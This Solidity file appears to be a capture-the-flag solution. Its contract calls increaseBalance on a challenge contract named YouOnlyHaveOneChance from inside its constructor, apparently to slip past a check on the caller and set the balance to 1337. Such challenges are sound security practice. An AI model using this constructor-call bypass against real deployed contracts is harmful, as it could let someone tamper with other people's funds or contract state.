// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./YouOnlyHaveOneChance.sol";

contract HackYouOnlyHaveOneChance {
    constructor(address _addr) {
        YouOnlyHaveOneChance c=YouOnlyHaveOneChance(_addr);
        c.increaseBalance(1337 - c.balanceAmount());
    }
}
